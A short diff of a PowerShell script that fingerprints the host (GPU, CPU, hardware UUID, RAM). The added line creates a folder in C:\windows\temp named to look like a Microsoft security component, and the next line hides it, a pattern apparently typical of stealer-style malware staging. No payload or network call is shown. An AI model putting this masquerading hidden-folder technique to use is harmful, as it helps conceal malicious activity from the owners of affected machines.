@@ -11,6 +11,7 @@ $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
+md C:\windows\temp\Win.microsoft.Security.temp
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 #####################################################################
 
